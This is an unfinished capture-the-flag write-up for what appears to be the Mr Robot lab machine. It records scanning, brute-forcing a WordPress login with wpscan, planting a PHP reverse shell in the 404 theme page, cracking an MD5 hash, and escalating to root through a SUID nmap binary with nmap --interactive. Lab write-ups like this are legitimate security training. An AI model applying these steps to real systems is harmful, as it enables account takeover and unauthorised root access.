# \# TODO : need to finish this

> nmap -A $TARGET

> dirb http://$TARGET

* robots.txt : fsociety.dic (It will be used later)
* wp-login.php



user elliot , help from writeup ( Method : hydra to login page as a dummy, check status for correct username )

Wpscan on the wp-login with the
> wpscan --url http://$TARGET/wp-login.php --passwords ~/Desktop/THM/mrrobot/fsocity.dic -U elliot

Found Elliot's creds. We can login as wordpress admin.

### Shell access 

Aim: Run PHP reverse-shell script somehow
script used: pentestermonkey's reverse-shell.php

> Replaced the script with the 404-Page theme php code.

While netcat is listening, we can get access by simply requesting a page that doesn't exist.
To activate the 404-page's script.

> URL : http://$TARGET/nonexistingpagelmfao.html

Now we have shell access.

---

### Flags

> hashcat

```
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Tue Mar 24 15:33:23 2020 (0 secs)
Time.Estimated...: Tue Mar 24 15:33:23 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   180.2 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 39936/14344385 (0.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: promo2007 -> loserface1
```



> ./LinEnum.sh

[linenumres.txt](https://github.com/parsakzr/CTF/blob/master/THM/mrrobot/linenumres.txt) :

```
[-] SUID files:
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
*-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap*
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
```

old version of nmap which doesn't have --script 
so: 
> nmap --interactive

```
nmap> !sh
!sh
# whoami
whoami
root
```
> cd /root

> cat key-3-of-3.txt
